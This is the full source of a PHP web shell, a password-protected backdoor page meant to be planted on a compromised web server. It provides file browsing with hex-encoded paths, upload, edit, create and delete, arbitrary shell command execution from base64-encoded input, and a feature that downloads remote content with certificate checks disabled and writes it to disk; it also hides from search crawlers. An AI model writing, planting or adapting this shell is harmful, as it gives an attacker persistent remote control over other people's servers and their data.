<?php
session_start();
error_reporting(0);


$passwordHash = "e18b798fbf8b3f67a0d15a46846e639e";

if (isset($_POST['password'])) {
    $inputPassword = md5($_POST['password']);

    if ($inputPassword === $passwordHash) {
        $_SESSION['login'] = true;
    }
}

if (!isset($_SESSION['login']) || $_SESSION['login'] !== true) {
?>
    <form method="POST">
        <input type="password" name="password">
        <input type="submit" value="Login">
    </form>
<?php
    exit;
}

function h2b($hexstr)
{
    $ret = '';
  for ($i=0; $i < strlen($hexstr); $i++){
    $ret .= dechex(ord($hexstr[$i]));
  }
  return $ret;
}

function b2h($binstr) {
    $ret = '';
  for ($i=0; $i < strlen($binstr)-1; $i+=2){
    $ret .= chr(hexdec($binstr[$i].$binstr[$i+1]));
  }
  return $ret;
}

$dir = isset($_GET['dr']) ? b2h($_GET['dr']) : '.';
$dir = str_replace('\\', '/', $dir);
$files = @scandir($dir);

function fperms($file)
{
    return substr(sprintf('%o', fileperms($file)), -4);
}

function is_can_write($file)
{
    return is_writable($file);
}

if (isset($_FILES['file_upload'])) {
    if (move_uploaded_file($_FILES['file_upload']['tmp_name'], $dir . '/' . $_FILES['file_upload']['name'])) {
        echo 'Uploaded Successfully.';
    } else {
        echo 'Failed to Upload.';
    }
}

if ($_GET['e']) {
    if (isset($_GET['fp'])) {
        $file = b2h($_GET['fp']);
        $content = file_get_contents($file);
        if ($content !== false) {
            echo '<form method="post" action="" onsubmit="save()">';
            echo '<textarea id="file_content" name="file_content" rows="30" cols="100">' . htmlspecialchars($content) . '</textarea>';
            echo '<input type="hidden" name="edited_file" value="' . htmlspecialchars($file) . '">';
            echo '<input type="submit" name="submit_edit">';
            echo '</form>';
        } else {
            echo 'Cant read the file.';
        }
    } else if ($_GET['cfp']) {
        echo '<form method="post" action="" onsubmit="save()">';
        echo '<textarea id="file_content" name="file_content" rows="30" cols="100" placeholder="content"></textarea>';
        echo '<input type="text" name="edited_file" placeholder="file.php" value="">';
        echo '<input type="submit" name="nfl_sbm">';
        echo '</form>';
    } else if ($_GET['cdr']) {
        echo '<form method="post" action="" onsubmit="saveDirectory()">';
        echo '<input type="text" name="ndr" placeholder="directory" value="">';
        echo '<input type="submit" name="ndr_sbm">';
        echo '</form>';
    }
}

if ($_GET['v']) {
    if (isset($_GET['fp'])) {
        $file = b2h($_GET['fp']);
        $content = file_get_contents($file);
        if ($content !== false) {
            echo '<textarea rows="30" cols="100" disabled>' . htmlspecialchars($content) . '</textarea>';
        } else {
            echo 'Cant read the file.';
        }
    }
}

if ($_GET['c']) {
    echo '<form method="post" action="" onsubmit="cmLol()">';
    echo '<input type="text" name="cm" id="cmm" placeholder="yoman" value="">';
    echo '<input type="submit">';
    echo '</form>';
}

if ($_GET['gc']) {
    echo '<form method="post" action="">';
    echo '<input type="text" name="ulr" id="gc" placeholder="yoman" value="">';
    echo '<input type="text" name="fnm" id="gc" placeholder="yoman" value="">';
    echo '<input type="submit">';
    echo '</form>';
}

function mkd($pth)
{
    $ret = mkdir($pth);
    return $ret === true || is_dir($pth);
}

if (isset($_POST['submit_edit'])) {
    $file = $_POST['edited_file'];
    $content = base64_decode($_POST['file_content']);
    if (file_put_contents($file, $content) !== false) {
        echo 'File Saved.';
    } else {
        echo 'Failed to Edit.';
    }
} else if (isset($_POST['nfl_sbm'])) {
    $file = $_POST['edited_file'];
    $content = base64_decode($_POST['file_content']);
    if (file_put_contents("$dir/$file", $content) !== false) {
        echo 'File Saved.';
    } else {
        echo 'Failed to Edit.';
    }
} else if (isset($_POST['ndr_sbm'])) {
    $ndr = $_POST['ndr'];
    if (mkd("$dir/$ndr")) {
        echo 'Dir Created.';
    } else {
        echo 'Failed to Create.';
    }
} else if (isset($_POST['cm'])) {
    $cm = $_POST['cm'];
    $ccc = base64_decode($cm);
    echo `$ccc`;
} else if (isset($_POST['ulr']) && isset($_POST['fnm'])) {
    $ulr = $_POST['ulr'];
    $fnm = $_POST['fnm'];
    $arrContextOptions=array(
        "ssl"=>array(
            "verify_peer"=>false,
            "verify_peer_name"=>false,
        ),
    );      
    $ctnt = file_get_contents($ulr, false, stream_context_create($arrContextOptions));
    if (file_put_contents("$dir/$fnm", base64_decode($ctnt))!== false) {
        echo 'File Saved.';   
    } else {
        echo 'Failed to Create.';
    }
}

if ($_GET['d']) {
    if (isset($_GET['fp'])) {
        $file = b2h($_GET['fp']);
        if (unlink($file)) {
            echo 'File Deleted.';
        } else {
            echo 'Failed to Delete.';
        }
    }
}

$uname = php_uname();
$current_dir = realpath($dir);
?>

<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="nofollow, robots">
    <title>RPRPRPRPRP</title>
    <style>
        .red {
            color: red;
        }

        .green {
            color: green;
        }

        .black {
            color: black;
        }

        .td {
            text-decoration: none;
            color: #000000;
            font-size: 18px;
        }

        table {
            border: 1px solid #ccc;
            border-collapse: collapse;
            margin: 0;
            padding: 0;
            width: 100%;
            table-layout: fixed;
        }

        table caption {
            font-size: 1.5em;
            margin: .5em 0 .75em;
        }

        table tr {
            background-color: #f8f8f8;
            border: 1px solid #ddd;
            padding: .35em;
        }

        table th,
        table td {
            padding: .625em;
            text-align: center;
        }

        table th {
            font-size: .85em;
            letter-spacing: .1em;
            text-transform: uppercase;
        }

        @media screen and (max-width: 600px) {
            table {
                border: 0;
            }

            table caption {
                font-size: 1.3em;
            }

            table thead {
                border: none;
                clip: rect(0 0 0 0);
                height: 1px;
                margin: -1px;
                overflow: hidden;
                padding: 0;
                position: absolute;
                width: 1px;
            }

            table tr {
                border-bottom: 3px solid #ddd;
                display: block;
                margin-bottom: .625em;
            }

            table td {
                border-bottom: 1px solid #ddd;
                display: block;
                font-size: .8em;
                text-align: right;
            }

            table td::before {
                content: attr(data-label);
                float: left;
                font-weight: bold;
                text-transform: uppercase;
            }

            table td:last-child {
                border-bottom: 0;
            }
        }

        body {
            font-family: "Open Sans", sans-serif;
            line-height: 1.25;
        }
    </style>
</head>

<body>
    <table>
        <caption>
            <?php
$normalizedDir = str_replace('\\', '/', realpath($dir));
$sd = explode("/", $normalizedDir);

foreach ($sd as $cd => $cdr) {
    // Handle root directory
    if ($cdr == "" && $cd == 0) {
        echo '<a class="td" href="?dr=2f">/</a>';
        continue;
    }
    
    // Skip empty segments (can occur with double slashes)
    if ($cdr == "") continue;
    
    // Handle Windows drive letters (e.g., "C:")
    if ($cd == 0 && substr($cdr, -1) == ':') {
        echo '<a class="td" href="?dr=' . h2b($cdr . '/') . '">' . $cdr . '/</a>';
        continue;
    }
    
    echo '<a class="td" href="?dr=';
    for ($i = 0; $i <= $cd; $i++) {
        echo h2b($sd[$i]);
        // Fixed: compare $i with $cd, not $sd
        if ($i != $cd) echo h2b("/");
    }
    echo '">' . $cdr . "/</a>";
}
            echo ' [ <a class="td" href="?dr=' . h2b(dirname(__FILE__)) . '">HOME</a> ]';
            echo ' [ <a class="td" href="?dr='. h2b($dir). '&gc=1">GContent</a> ]';
            ?>
        </caption>
        <center>
            <form method="POST" enctype="multipart/form-data">
                <label>Upload file:</label>
                <input type="file" name="file_upload">
                <input type="submit" value="Upload">
                <input type="hidden" name="dir" value="<?php echo $dir; ?>">
            </form>
        </center>
        <center><b>Information</b> : <?= php_uname(); ?></center>

        <thead>
            <tr>
                <th scope="col">NAME</th>
                <th scope="col">Permissions</th>
                <th scope="col">Action</th>
            </tr>
        </thead>
        <tbody>
            <?php
            foreach ($files as $file) {
                if ($file == '..') continue;
                $href = h2b("$dir/$file");
                echo '<tr>';
                echo '<td>';
                if (is_dir("$dir/$file")) {
                    if ($file == '.') {
                        echo '';
                    } else {
                        echo '<a class="td" href="?dr=' . $href . '">' . $file . '</a>';
                    }
                } else {
                    echo '<a class="td" href="?dr=' . h2b($dir) . '&fp=' . $href . '&v=1">' . $file . '</a>';
                }
                echo '</td>';
                echo '<td>';
                if (is_file("$dir/$file")) {
                    echo '<span class="' . (fperms("$dir/$file") ? 'green' : 'red') . '">' . fperms("$dir/$file") . '</span>';
                } else {
                    echo '<span class="' . (is_can_write("$dir/$file") ? 'green' : 'red') . '">' . (is_can_write("$dir/$file") ? 'Can Write' : 'Not Writable') . '</span>';
                }
                echo '</td>';
                echo '<td>';
                if (is_file("$dir/$file")) {
                    echo '<a href="?dr=' . h2b($dir) . '&fp=' . $href . '&e=1" class="td">EDIT</a> | <a href="?dr=' . h2b($dir) . '&fp=' . $href . '&d=1" class="td">DELETE</a>';
                } else {
                    echo '<a class="td" href="?dr=' . $href . '&e=1&cfp=1">NFILE</a> | <a class="td" href="?dr=' . $href . '&e=1&cdr=1">NDIR</a>';
                }
                echo '</td>';
                echo '</tr>';
            }
            ?>
        </tbody>
    </table>
    <script>
        function save() {
            let doc = document.getElementById('file_content');
            doc.value = btoa(doc.value);
            return true;
        }

        function saveDirectory() {
            let doc = document.getElementById('ndr')
            doc.value = btoa(doc.value);
            return true;
        }

        function cmLol() {
            let doc = document.getElementById('cmm')
            doc.value = btoa(doc.value);
            return true;
        }
    </script>
</body>

</html>